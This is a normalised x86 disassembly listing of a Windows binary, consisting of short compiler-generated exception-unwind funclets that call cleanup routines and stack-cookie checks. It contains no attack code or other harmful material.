mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100036b0
sub_1005361b
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100036b0
sub_10053626
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10053650
lea ecx [ ebp + 0x8 ]
jmp sub_100036b0
sub_10053658
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x428 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10053680
mov eax [ ebp - 0x2c20 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c20 ] 0xfffffffe
mov ecx [ ebp - 0x2c24 ]
jmp sub_10001880
sub_100536a2
lea ecx [ ebp - 0x2c18 ]
jmp sub_10001880
sub_100536ad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c28 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100536e0
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_100536e8
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_100036b0
sub_10053701
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10053720
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10053728
mov ecx [ ebp - 0x18 ]
jmp sub_10001880
sub_10053730
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_100036b0
sub_10053749
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10053770
lea ecx [ ebp + 0x8 ]
jmp sub_100036b0
sub_10053778
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001880
sub_10053791
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100537b0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_100036b0
sub_100537c9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100537f0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_10001880
sub_10053809
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10053824
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
